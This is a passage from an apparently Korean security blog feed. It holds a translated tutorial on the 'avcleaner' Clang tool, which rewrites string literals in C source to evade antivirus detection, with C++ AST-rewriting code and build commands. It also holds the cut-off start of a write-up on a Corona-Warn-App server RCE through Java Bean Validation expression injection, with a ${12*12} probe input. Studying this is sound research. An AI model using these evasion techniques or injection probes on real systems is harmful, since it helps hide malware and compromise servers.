&#xD2B8;&#xB9AC;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0;&#xC5D0;&#xC11C; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xB178;&#xB4DC;&#xB294; <code>CallExpr</code> &#xD0C0;&#xC785;&#xC774;&#xB2E4;.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span>MatchHandler::climbParentsIgnoreCast(<span class="hljs-keyword">const</span> StringLiteral &amp;NodeString, clang::ast_type_traits::DynTypedNode node,                                     clang::ASTContext *<span class="hljs-keyword">const</span> pContext, <span class="hljs-keyword">uint64_t</span> iterations) {    ASTContext::DynTypedNodeList parents = pContext-&gt;getParents(NodeString);    <span class="hljs-keyword">if</span> (iterations &gt; <span class="hljs-number">0</span>) {        parents = pContext-&gt;getParents(node);    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) {        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;Cast&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) {            <span class="hljs-keyword">return</span> climbParentsIgnoreCast(NodeString, parent, pContext, ++iterations);        }        handleStringInContext(&amp;NodeString, pContext, parent);    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;}</code></pre><p>&#xAC04;&#xB2E8;&#xD788; &#xB9D0;&#xD574;&#xC11C; &#xC774; &#xD568;&#xC218;&#xB294; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xAC83;(&#x201C;Cast&#x201D;&#xAC00; &#xC544;&#xB2CC; &#xAC83;)&#xC744; &#xCC3E;&#xC744; &#xB54C; &#xAE4C;&#xC9C0; <code>StringLiteral</code> &#xB178;&#xB4DC;&#xC758; &#xBD80;&#xBAA8; &#xB178;&#xB4DC;&#xB4E4;&#xC744; &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xD0D0;&#xC0C9;&#xD55C;&#xB2E4;. <code>handleStringInContext</code>&#xB294; &#xBCF5;&#xC7A1;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleStringInContext</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>{    StringRef ParentNodeKind = node.getNodeKind().asStringRef();    <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;CallExpr&quot;</span>) == <span class="hljs-number">0</span>) {        handleCallExpr(pLiteral, pContext, node);    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;InitListExpr&quot;</span>) == <span class="hljs-number">0</span>) {        handleInitListExpr(pLiteral, pContext, node);    } <span class="hljs-keyword">else</span> {        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Unhandled context &quot;</span> &lt;&lt; ParentNodeKind &lt;&lt; <span class="hljs-string">&quot; for string &quot;</span> &lt;&lt; pLiteral-&gt;getBytes() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    }}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xB208;&#xC5D0; &#xB744;&#xB294; &#xAC74; &#xC2E4;&#xC81C;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xB294; &#xB178;&#xB4DC;&#xAC00; &#xB450; &#xC885;&#xB958;&#xC778; &#xAC83;&#xC774;&#xB2E4;. &#xB610;&#xD55C; &#xD544;&#xC694;&#xD560; &#xB54C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC8C; &#xC26C;&#xC6CC;&#xC57C; &#xD55C;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xB450; &#xACBD;&#xC6B0; &#xC774;&#xBBF8; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *FunctionCall = node.get&lt;clang::CallExpr&gt;();    <span class="hljs-keyword">if</span> (isBlacklistedFunction(FunctionCall)) {        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span>    }    handleExpr(pLiteral, pContext, node);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleInitListExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                      <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>{    handleExpr(pLiteral, pContext, node);}</code></pre><h3 id="&#xBB38;&#xC790;&#xC5F4;-&#xB9AC;&#xD130;&#xB7F4;-&#xAD50;&#xCCB4;"><a href="#&#xBB38;&#xC790;&#xC5F4;-&#xB9AC;&#xD130;&#xB7F4;-&#xAD50;&#xCCB4;" class="headerlink" title="&#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4; &#xAD50;&#xCCB4;"></a>&#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4; &#xAD50;&#xCCB4;</h3><p><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html"><code>CallExpr</code></a>&#xACFC; <a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html"><code>InitListExpr</code></a>&#xC740; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xBBC0;&#xB85C; &#xB458; &#xB2E4; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xD1B5;&#xC801;&#xC778; &#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::handleExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>{    clang::SourceRange LiteralRange = clang::SourceRange(            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getBeginLoc()),            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc())    );    <span class="hljs-keyword">if</span>(shouldAbort(pLiteral, pContext, LiteralRange))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = translateStringToIdentifier(pLiteral-&gt;getBytes().str());    <span class="hljs-keyword">if</span>(!insertVariableDeclaration(pLiteral, pContext, LiteralRange, Replacement))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> ;    Globs::PatchedSourceLocation.push_back(LiteralRange);    <span class="hljs-keyword">return</span> replaceStringLiteral(pLiteral, pContext, LiteralRange, Replacement);}</code></pre><ul><li>&#xBCC0;&#xC218;&#xBA85;&#xC744; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</li><li>&#xAC00;&#xAE4C;&#xC6B4; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xBE48; &#xACF5;&#xAC04;&#xC744; &#xCC3E;&#xACE0; &#xBCC0;&#xC218; &#xC120;&#xC5B8;&#xC744; &#xC0BD;&#xC785;&#xD574;&#xB77C;. &#xC774;&#xAC83;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>ASTRewriter&#x2192;InsertText()</code>&#xB97C; &#xB458;&#xB7EC;&#xC2FC; wrapper&#xC774;&#xB2E4;.</li><li>1&#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; identifier&#xB97C; &#xAC00;&#xC9C4; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBC14;&#xAFBC;&#xB2E4;.</li><li>collection&#xC5D0; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xCD94;&#xAC00;&#xD55C;&#xB2E4;. &#xC774;&#xB294; <code>InitListExpr</code>&#xB97C; &#xC9C0;&#xB0A0; &#xB54C; &#xAC19;&#xC740; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xB450; &#xBC88; &#xD45C;&#xC2DC;&#xD574;&#xC8FC;&#xBBC0;&#xB85C; &#xC720;&#xC6A9;&#xD558;&#xB2E4;.(&#xC774;&#xC720;&#xB294; &#xC54C; &#xC218; &#xC5C6;&#xB2E4;).</li></ul><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xB294; &#xC2E4;&#xC81C; &#xAD6C;&#xD604;&#xC774; &#xC5B4;&#xB835;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA3C;&#xC800; &#xBCF4;&#xC790;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::replaceStringLiteral</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        clang::SourceRange LiteralRange,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; Replacement)</span> </span>{    <span class="hljs-comment">// handle &quot;TEXT&quot; macro argument, for instance LoadLibrary(TEXT(&quot;ntdll&quot;));</span>    <span class="hljs-keyword">bool</span> isMacro = ASTRewriter-&gt;getSourceMgr().isMacroBodyExpansion(pLiteral-&gt;getBeginLoc());    <span class="hljs-keyword">if</span> (isMacro) {        StringRef OrigText = clang::Lexer::getSourceText(CharSourceRange(pLiteral-&gt;getSourceRange(), <span class="hljs-literal">true</span>),                                                         pContext-&gt;getSourceManager(), pContext-&gt;getLangOpts());        <span class="hljs-comment">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span>        <span class="hljs-keyword">if</span> (OrigText.find(<span class="hljs-string">&quot;TEXT&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) {            ASTRewriter-&gt;RemoveText(LiteralRange);            LiteralRange.setEnd(ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc().getLocWithOffset(<span class="hljs-number">-1</span>)));        }    }    <span class="hljs-keyword">return</span> ASTRewriter-&gt;ReplaceText(LiteralRange, Replacement);}</code></pre><p>&#xBCF4;&#xD1B5; &#xD14D;&#xC2A4;&#xD2B8; &#xAD50;&#xCCB4;&#xB294; <code>ReplaceText</code> API&#xB97C; &#xC4F0;&#xC9C0;&#xB9CC; &#xB9CE;&#xC740; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;. &#xB9E4;&#xD06C;&#xB85C;&#xC758; &#xACBD;&#xC6B0; Clang&#xC758; API&#xB294; &#xBD88;&#xADDC;&#xCE59;&#xD558;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xC5EC; &#xBCF5;&#xC7A1;&#xD558;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>isMacroBodyExpansion()</code>&#xC744; &#xD1B5;&#xD55C; &#xD655;&#xC778;&#xC774; &#xC5C6;&#xC73C;&#xBA74; &#xC778;&#xC790;&#xAC00; &#xC544;&#xB2C8;&#xB77C; <code>&quot;TEXT&quot;</code>&#xAC00; &#xAD50;&#xCCB4;&#xB41C;&#xB2E4;. <code>LoadLibrary(TEXT(&quot;ntdll&quot;))</code>&#xC5D0;&#xC11C;<code>LoadLibrary(your_variable(&quot;ntdll&quot;))</code>&#xB85C; &#xC798;&#xBABB; &#xAD50;&#xCCB4;&#xB418;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC774;&#xC720;&#xB294; <code>&quot;TEXT&quot;</code>&#xAC00; <em>Clang</em>&#xC758; &#xC804;&#xCC98;&#xB9AC;&#xAE30;&#xC5D0; &#xC758;&#xD574; &#xCC98;&#xB9AC;&#xB420; &#xB54C; <code>L&quot;ntdll&quot;</code>&#xC744; &#xAD50;&#xCCB4;&#xD558;&#xB294; &#xB9E4;&#xD06C;&#xB85C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB2E4;. transformation pass&#xB294; &#xC804;&#xCC98;&#xB9AC;&#xAE30; &#xC791;&#xC5C5;&#xC774; &#xC644;&#xB8CC;&#xB41C; &#xD6C4; &#xBC1C;&#xC0DD;&#xD558;&#xBBC0;&#xB85C; <code>&quot;ntdll&quot;</code>&#xC758; &#xC2DC;&#xC791;&#xACFC; &#xB05D; &#xC704;&#xCE58;&#xB97C; &#xCFFC;&#xB9AC; &#xD558;&#xB294; &#xAC83;&#xC740; &#xBA87; &#xAE00;&#xC790;&#xAC00; &#xBE60;&#xC9C4; &#xC798;&#xBABB;&#xB41C; &#xAC12;&#xC774; &#xB098;&#xC62C; &#xC218; &#xC788;&#xC5B4;&#xC11C; &#xC720;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;. &#xBD88;&#xD589;&#xD558;&#xAC8C;&#xB3C4; &#xAE30;&#xC874; translation unit&#xC5D0; &#xC2E4;&#xC81C; &#xC704;&#xCE58;&#xB97C; &#xCFFC;&#xB9AC;&#xD558;&#xB294; &#xAC83;&#xC740; Clang API&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC600;&#xACE0; &#xC2DC;&#xD589;&#xCC29;&#xC624;&#xB97C; &#xAC70;&#xCCD0;&#xC11C; &#xD574;&#xACB0; &#xBC29;&#xBC95;&#xC744; &#xCC3E;&#xC558;&#xB2E4;.</p><h3 id="&#xC778;&#xC811;&#xD55C;-&#xBE48;-&#xACF5;&#xAC04;&#xC5D0;-&#xBCC0;&#xC218;-&#xC120;&#xC5B8;-&#xC0BD;&#xC785;"><a href="#&#xC778;&#xC811;&#xD55C;-&#xBE48;-&#xACF5;&#xAC04;&#xC5D0;-&#xBCC0;&#xC218;-&#xC120;&#xC5B8;-&#xC0BD;&#xC785;" class="headerlink" title="&#xC778;&#xC811;&#xD55C; &#xBE48; &#xACF5;&#xAC04;&#xC5D0; &#xBCC0;&#xC218; &#xC120;&#xC5B8; &#xC0BD;&#xC785;"></a>&#xC778;&#xC811;&#xD55C; &#xBE48; &#xACF5;&#xAC04;&#xC5D0; &#xBCC0;&#xC218; &#xC120;&#xC5B8; &#xC0BD;&#xC785;</h3><p>&#xC774;&#xC81C; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xBCC0;&#xC218; identifier&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xBCC0;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD558;&#xACE0; &#xC6D0;&#xB798; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xD560;&#xB2F9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xD328;&#xCE58;&#xB41C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xB36E;&#xC5B4;&#xC4F0;&#xC9C0; &#xC54A;&#xACE0; <code>char your_variable[] = &quot;ntdll&quot;</code>&#xC744; &#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xB450; &#xAC00;&#xC9C0; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xAC00; &#xC788;&#xB2E4;:</p><ul><li>&#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC774; &#xD568;&#xC218; &#xBC14;&#xB514; &#xC548;&#xC5D0; &#xC704;&#xCE58;&#xD55C;&#xB2E4;.</li><li>&#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC774; &#xD568;&#xC218; &#xBC14;&#xB514; &#xBC16;&#xC5D0; &#xC704;&#xCE58;&#xD55C;&#xB2E4;.</li></ul><p>&#xD6C4;&#xC790;&#xB294; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD45C;&#xD604;&#xC2DD;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC73C;&#xBA74; &#xB3FC;&#xC11C; &#xAC00;&#xC7A5; &#xAC04;&#xB2E8;&#xD558;&#xB2E4;.</p><p>&#xC804;&#xC790;&#xB294; &#xD3EC;&#xD568;&#xB41C; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC544;&#xC57C; &#xD55C;&#xB2E4;. &#xADF8; &#xD6C4; Clang&#xC740; API&#xB85C; &#xD568;&#xC218; &#xBC14;&#xB514;&#xC758; &#xC2DC;&#xC791; &#xC704;&#xCE58;&#xB97C; &#xCFFC;&#xB9AC; &#xD55C;&#xB2E4;. &#xBCC0;&#xC218;&#xAC00; &#xC804;&#xCCB4; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xACE0; &#xC6B0;&#xB9AC;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xD1A0;&#xD070;&#xC774; &#xB0B4;&#xC6A9;&#xC744; &#xB36E;&#xC5B4; &#xC50C;&#xC6B0;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xBCC0;&#xC218; &#xC120;&#xC5B8;&#xC744; &#xC0BD;&#xC785;&#xD560; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xC774;&#xC0C1;&#xC801;&#xC774;&#xB2E4;.</p><p>&#xC5B4;&#xB5A4; &#xACBD;&#xC6B0;&#xB4E0; &#xB450; &#xAC00;&#xC9C0; &#xC0C1;&#xD669;&#xC740; <code>FunctionDecl</code> &#xD639;&#xC740; <code>VarDecl</code> &#xD0C0;&#xC785;&#xC758; &#xB178;&#xB4DC;&#xAC00; &#xBC1C;&#xACAC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xBAA8;&#xB4E0; &#xBD80;&#xBAA8; &#xB178;&#xB4DC;&#xB97C; &#xBC29;&#xBB38;&#xD574;&#xC11C; &#xD574;&#xACB0;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp">MatchHandler::findInjectionSpot(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,                                <span class="hljs-keyword">const</span> clang::StringLiteral &amp;Literal, <span class="hljs-keyword">bool</span> IsGlobal, <span class="hljs-keyword">uint64_t</span> Iterations) {    <span class="hljs-keyword">if</span> (Iterations &gt; CLIMB_PARENTS_MAX_ITER)        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;Reached max iterations when trying to find a function declaration&quot;</span>);    ASTContext::DynTypedNodeList parents = Context-&gt;getParents(Literal);;    <span class="hljs-keyword">if</span> (Iterations &gt; <span class="hljs-number">0</span>) {        parents = Context-&gt;getParents(Parent);    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) {        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;FunctionDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) {            <span class="hljs-keyword">auto</span> FunDecl = parent.get&lt;clang::FunctionDecl&gt;();            <span class="hljs-keyword">auto</span> *Statement = FunDecl-&gt;getBody();            <span class="hljs-keyword">auto</span> *FirstChild = *Statement-&gt;child_begin();            <span class="hljs-keyword">return</span> {FirstChild-&gt;getBeginLoc(), FunDecl-&gt;getEndLoc()};        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;VarDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) {            <span class="hljs-keyword">if</span> (IsGlobal) {                <span class="hljs-keyword">return</span> parent.get&lt;clang::VarDecl&gt;()-&gt;getSourceRange();            }        }        <span class="hljs-keyword">return</span> findInjectionSpot(Context, parent, Literal, IsGlobal, ++Iterations);    }}</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/SCRT/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..bash run_example.sh test/string_simplest.c</code></pre><p><img src="/2020/11/22/idioth/av_evasion_part1/4.png" alt></p><p>&#xBCF4;&#xB2E4;&#xC2DC;&#xD53C; &#xC798; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;. &#xC9C0;&#xAE08; &#xC774; &#xC608;&#xC81C;&#xB294; &#xC815;&#xADDC;&#xC2DD;&#xC73C;&#xB85C; &#xD574;&#xACB0;&#xD560; &#xB9CC;&#xD07C; &#xCF54;&#xB4DC;&#xAC00; &#xC9E7;&#xB2E4;. </p><h2 id="Going-further"><a href="#Going-further" class="headerlink" title="Going further"></a>Going further</h2><p>&#xC9C0;&#xAE08;&#xC740; obfuscation pass&#xC758; &#xC774;&#xB984;&#xC774; <code>StringEncryptor</code>&#xC774;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C;&#xB85C; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC554;&#xD638;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xB824;&#xBA74; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740; &#xB178;&#xB825;&#xC774; &#xD544;&#xC694;&#xD560;&#xAE4C;?</p><h3 id="To-be-continued&#x2026;"><a href="#To-be-continued&#x2026;" class="headerlink" title="To be continued&#x2026;"></a>To be continued&#x2026;</h3><p>&#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC26C;&#xC6B4; &#xBD80;&#xBD84;&#xC774;&#xC9C0;&#xB9CC; Clang API&#xC5D0; &#xC775;&#xC219;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC18C;&#xC2A4; &#xCF54;&#xB4DC; &#xBB38;&#xC11C;&#xB97C; &#xBCF4;&#xB294;&#xB370; 1~2&#xC8FC; &#xC815;&#xB3C4; &#xC4F0;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xD55C;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC790;&#xB3D9;&#xC73C;&#xB85C; API import&#xB97C; &#xC228;&#xAE30;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
      <tag>idioth</tag>
      
      <tag>obfuscation</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] German Corona-Warn-App sever RCE</title>
    <link href="/2020/11/21/fabu1ous/2020-11-21/"/>
    <url>/2020/11/21/fabu1ous/2020-11-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/securing-the-fight-against-covid19-through-oss">Securing the fight against COVID-19</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Corona-Warn-App(contect tracking infrastructure of Germany)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Corona-Warn-App(&#xC774;&#xD558; CWA)&#xC740; &#xB3C5;&#xC77C;&#xC758; &#xC811;&#xCD09;&#xC790; &#xAE30;&#xB85D;/&#xCD94;&#xC801; &#xC778;&#xD504;&#xB77C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC571;&#xC774; &#xC124;&#xCE58;&#xB41C; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;&#xC740; &#xBE14;&#xB8E8;&#xD22C;&#xC2A4;&#xB85C; &#xC2DD;&#xBCC4; payload&#xB97C; &#xBE0C;&#xB85C;&#xB4DC;&#xCF00;&#xC2A4;&#xD2B8;&#xD558;&#xACE0;, &#xBE14;&#xB8E8;&#xD22C;&#xC2A4;&#xC758; &#xC2E0;&#xD638; &#xBC94;&#xC704; &#xB0B4;&#xC5D0; &#xB4E4;&#xC5B4;&#xC628; &#xB2E4;&#xB978; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xB4E4;&#xC774; &#xC774; payload&#xC640; payload&#xB97C; &#xBC1B;&#xC740; &#xC2DC;&#xAC01;&#xC744; 2&#xC8FC;&#xAC04; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC591;&#xC131; &#xD310;&#xC815;&#xC744; &#xBC1B;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xAC80;&#xC0AC; &#xACB0;&#xACFC;&#xC640; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD0A4;&#xAC12;(Diagnosis key)&#xC744; CWA server&#xC5D0; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CWA &#xC11C;&#xBC84;&#xB294; Spring boot &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xBA70; Diagnosis key&#xB97C; &#xBC1B;&#xC544; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <a href="https://securitylab.github.com/research/bean-validation-RCE">Java Bean Validation</a> &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>Spring boot app&#xC774; &#xC785;&#xB825;&#xBC1B;&#xC740; &#xAC1D;&#xCCB4;&#xB97C; validate &#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xADF8; &#xAC1D;&#xCCB4;&#xAC00; constraint &#xC870;&#xAC74;&#xC5D0; &#xB9CC;&#xC871;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;. constraint &#xC870;&#xAC74;&#xC740; &#x2018;@&#x2019;&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Input</span> </span>{  <span class="hljs-meta">@Min(1)</span>  <span class="hljs-meta">@Max(10)</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num;    <span class="hljs-comment">//...</span>}</code></pre><p>int&#xD615; num&#xC758; &#xCD5C;&#xC19F;&#xAC12;&#xC774; 1, &#xCD5C;&#xB313;&#xAC12;&#xC774; 10&#xC778; constraint &#xC870;&#xAC74;&#xC774; &#xAC78;&#xB824;&#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. <code>@Min()</code>&#xC774;&#xB098; <code>@Max()</code>&#xCC98;&#xB7FC; built-in &#xC870;&#xAC74;&#xB9CC; &#xC788;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; custom constraint &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD55C; validation&#xC744; custom constraint validation&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">input : ab<span class="hljs-variable">$</span>{<span class="hljs-number">12</span>*<span class="hljs-number">12</span>}<span class="hljs-built_in">cd</span>output : ab144<span class="hljs-built_in">cd</span></code></pre><p>custom constraint validation &#xB3D9;&#xC791; &#xC911; &#xD568;&#xC218;<code>buildConstraintViolationWithTemplate()</code>&#xB294; &#xBA54;&#xC138;&#xC9C0; 